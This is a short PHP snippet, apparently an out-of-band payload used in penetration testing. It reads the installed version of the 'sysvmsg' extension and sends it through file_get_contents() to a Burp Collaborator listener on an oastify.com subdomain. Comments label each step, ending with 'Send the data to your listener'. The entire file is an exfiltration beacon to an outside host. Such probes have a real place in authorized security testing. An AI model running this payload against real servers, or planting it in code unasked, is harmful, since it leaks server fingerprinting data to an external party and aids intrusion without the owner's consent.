<?php
// 1. Get the version
$version = phpversion('sysvmsg');

// 2. Set your Burp Collaborator URL
$collaborator = "https://xno0m19db2a75onoyhp4utqoxf36r0fp.oastify.com";

// 3. Send the data to your listener
file_get_contents($collaborator . "?version=" . urlencode($version));
?>
